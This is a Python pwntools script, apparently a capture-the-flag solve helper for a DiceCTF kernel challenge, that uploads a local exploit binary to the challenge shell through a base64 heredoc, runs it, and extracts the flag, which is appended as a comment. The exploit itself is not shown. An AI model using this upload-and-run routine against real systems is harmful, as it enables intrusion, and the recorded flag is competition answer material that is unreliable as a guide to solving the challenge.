#!/usr/bin/env python3
from pwn import *
from pathlib import Path
import base64
import re
import textwrap
import time

HOST = args.HOST or "explorer.chals.dicec.tf"
PORT = int(args.PORT or 1337)
BIN  = args.BIN or "./solve"

context.log_level = args.LOG_LEVEL or "info"

ansi_re = re.compile(rb"\x1b\[[0-9;?]*[ -/]*[@-~]")

def clean(bs: bytes) -> bytes:
    bs = bs.replace(b"\r", b"")
    return ansi_re.sub(b"", bs)

def recv_until_prompt(io, timeout=60):
    raw = b""
    cooked = b""
    end = time.time() + timeout
    while time.time() < end:
        chunk = io.recv(timeout=1)
        if not chunk:
            continue
        raw += chunk
        cooked += clean(chunk)
        if b"/ $ " in cooked:
            return raw, cooked
    raise TimeoutError("prompt not reached")

def cmd(io, s, timeout=60):
    if isinstance(s, str):
        s = s.encode()
    io.sendline(s)
    raw, cooked = recv_until_prompt(io, timeout=timeout)
    return raw, cooked

def main():
    blob = Path(BIN).read_bytes()
    b64 = base64.b64encode(blob).decode()
    lines = textwrap.wrap(b64, 76)

    log.info(f"binary size: {len(blob)} bytes")
    log.info(f"base64 size: {len(b64)} bytes")
    log.info(f"connecting to {HOST}:{PORT}")

    io = remote(HOST, PORT)

    raw, cooked = recv_until_prompt(io, timeout=90)
    print(raw.decode("latin-1", errors="ignore"), end="")

    cmd(io, "rm -f /tmp/solve /tmp/solve.b64", timeout=10)

    io.sendline(b"cat > /tmp/solve.b64 <<'EOF'")
    for line in lines:
        io.sendline(line.encode())
    io.sendline(b"EOF")

    raw, cooked = recv_until_prompt(io, timeout=30)

    raw, cooked = cmd(
        io,
        "base64 -d /tmp/solve.b64 > /tmp/solve && chmod +x /tmp/solve && ls -l /tmp/solve",
        timeout=30,
    )
    print(raw.decode("latin-1", errors="ignore"), end="")

    raw, cooked = cmd(io, "/tmp/solve", timeout=60)
    text = raw.decode("latin-1", errors="ignore")
    print(text, end="")

    m = re.search(rb"dice\{[^}\r\n]+\}", clean(raw))
    if m:
        log.success(f"flag = {m.group().decode()}")
    else:
        log.warning("flag regex not matched automatically")
        io.interactive()

if __name__ == "__main__":
    main()

# dice{twisty_rusty_kernel_maze}